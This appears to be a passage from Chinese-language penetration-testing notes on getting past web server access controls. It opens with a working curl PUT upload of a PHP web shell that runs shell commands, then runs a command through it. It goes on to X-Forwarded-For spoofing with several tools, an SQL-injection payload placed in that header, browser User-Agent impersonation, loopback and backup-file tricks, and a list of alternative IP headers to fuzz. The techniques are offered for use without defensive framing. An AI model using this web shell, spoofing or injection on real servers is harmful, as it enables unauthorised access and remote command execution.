
查看目录的请求选项： 
```
curl -v -X OPTIONS http://192.168.9.20/test/
```
使用 PUT方式上传后门：  
```
curl -v -X PUT -d '<?php system($_GET["cmd"]);?>' http://192.168.9.20/test/shell.php
```
访问`http://192.168.9.20/test/shell.php?cmd=id`

## XFF绕过(x-forwarded-for)

http://www.jianshu.com/p/98c08956183d

XFF是header请求头中的一个参数,是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。代表了HTTP的请求端真实的IP。

```
X-Forwarded-For: client1, proxy1, proxy2, proxy3

//浏览器IP，第一个代理服务器，第二个三个四个等等

curl http://192.168.2.191/service/ -H 'X-Forwarded-For:192.168.2.191'
```

### 利用方式

#### 1.绕过服务器过滤

XFF漏洞也称为IP欺骗。有些服务器通过XFF头判断是否是本地服务器，当判断为本地服务器时，才能访问相关内容。

```
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 192.168.1.1
```
##### hackbar绕过
```
按下F12
Load URL
勾选referer，然后把需要伪装的URL粘贴上去，例如：https://www.google.com
```
##### wfuzz绕过

```
wfuzz -z range,0000-9999 -H "X-Forwarded-For: FUZZ" http://127.0.0.1/get.php?
```
##### curl绕过

```
curl -H "X-Forwarded-For: 192.168.56.127" -I https://example.com
```
##### wget绕过

```
wget --header "X-Forwarded-For: 192.168.56.127" https://example.com
```
#### 2.XFF导致sql注入

XFF注入和SQL的header头部注入原理一样，服务器端会对XFF信息进行记录，但没有进行过滤处理，就容易导致sql注入的产生

```
X-Forwarded-for: 127.0.0.1' and 1=1#
```

然后进一步利用sql注入，进行渗透测试。

#### "You don't have permission to access this resource."

##### 尝试修改请求头信息
- 服务器可能会根据请求头中的某些信息来判断是否允许访问。例如，`User-Agent`、`Referer`或者`Authorization`等头信息可能会被用于访问控制。

- 尝试修改`User-Agent`头信息，将其伪装成合法的浏览器或者被允许访问的工具。例如，将`User-Agent`设置为服务器管理员常用的浏览器（如`Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/XXXXX Safari/537.36`），其中`XXXXX`是常见的 Chrome 版本号。

1. **桌面浏览器请求头示例**
   - **Google Chrome**
     - `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36`
     - 其中`Windows NT 10.0`表示操作系统为Windows 10，`Win64; x64`表示是64位系统，`AppleWebKit/537.36`是Chrome使用的WebKit内核版本相关信息，`KHTML, like Gecko`是为了兼容性声明类似于Gecko浏览器内核（用于Firefox），`Chrome/119.0.0.0`是Chrome浏览器版本，`Safari/537.36`是为了兼容部分基于Safari的网页标准。
   - **Mozilla Firefox**
     - `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0`
     - 这里`rv:119.0`表示渲染引擎（Gecko）的版本，`Gecko/20100101`是Firefox所使用的Gecko内核的基本标识，`Firefox/119.0`是Firefox浏览器的版本。
   - **Microsoft Edge**
     - `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0`
     - 因为Edge是基于Chromium内核，所以它的`User-Agent`头部和Chrome类似，多了`Edg/119.0.0.0`来标识Edge浏览器版本。
1. **移动设备浏览器请求头示例**
   - **iOS Safari**
     - `User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1`
     - 其中`iPhone`表示设备类型，`iPhone OS 17_0_3 like Mac OS X`是操作系统版本（类似Mac OS X系统），`AppleWebKit/605.1.15`是WebKit内核版本，`Version/17.0`是Safari浏览器版本，`Mobile/15E148`是移动设备相关的标识，`Safari/604.1`是Safari浏览器版本。
   - **Android Chrome**
     - `User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36`
     - `Linux`表示Android系统基于Linux内核，`Android 14`是操作系统版本，`Pixel 7`是设备型号，后面的部分和桌面版Chrome类似，`Mobile`表示是移动设备请求。
3. **移动应用请求头示例（以iOS和Android应用为例）**
   - **iOS应用（假设是一个自定义的HTTP请求应用）**
     - `User-Agent: APP_NAME/1.0 (iOS 17.0.3; iPhone14,3)`
     - 这里`APP_NAME`是应用名称，`1.0`是应用版本，`iOS 17.0.3`是操作系统版本，`iPhone14,3`是设备型号。通常还可能包含其他自定义的头部，如`Authorization`（用于用户认证），例如`Authorization: Bearer <access_token>`，其中`<access_token>`是用户登录后获取的授权令牌。
   - **Android应用（假设是一个自定义的HTTP请求应用）**
     - `User-Agent: APP_NAME/1.0 (Android 14; SM - G9980)`
     - 其中`APP_NAME`是应用名称，`1.0`是应用版本，`Android 14`是操作系统版本，`SM - G9980`是设备型号（例如三星Galaxy S23 Ultra的型号）。可能还会有其他头部用于与服务器交互，如`Content - Type`（如果应用向服务器发送数据），例如`Content - Type: application/json`，表示发送的数据格式是JSON。
4. **物联网设备请求头示例（以智能家居设备为例）**
   - 假设一个智能摄像头向服务器发送请求来上传视频数据。
     - `User-Agent: CAMERA_MODEL/1.2 (EmbeddedLinux; ARMv7)`
     - 其中`CAMERA_MODEL`是摄像头型号，`1.2`是设备固件版本，`EmbeddedLinux`表示设备操作系统是嵌入式Linux系统，`ARMv7`表示设备处理器架构。可能还会有`Content - Length`头部来指定上传数据的大小，例如`Content - Length: 1024`（表示上传数据大小为1024字节），以及`Content - Type: video/mp4`（如果上传的是MP4格式的视频数据）。
#### 本地回环地址绕过

- 可能设置了`Deny from all`和`Allow from 127.0.0.1`，这意味着只有本地回环地址可以访问。
- 尝试在测试环境中模拟本地访问。可以通过在本地机器上设置代理，将请求源 IP 伪装成`127.0.0.1`来访问该路径。

#### 查找备份文件：
- 开发人员有时会在服务器上留下备份文件。可以尝试访问`http://xxx.xxx.xxx.xxx/server - status.bak`、`http://xxx.xxx.xxx.xxx/server - status~`或者`http://xxx.xxx.xxx.xxx/server - status.old`等路径。这些备份文件可能包含和`server - status`相同或相似的信息，并且可能没有受到严格的访问限制。

#### 补充

服务器判断真实地址的参数有时不一定是XFF，可能是以下几个参数

```
x-forwarded-fot
x-remote-IP
x-originating-IP
x-remote-ip
x-remote-addr
x-client-IP
x-client-ip
x-Real-ip
```
使用模糊测试fuzz一下，或许能找到绕过服务器过滤的请求头
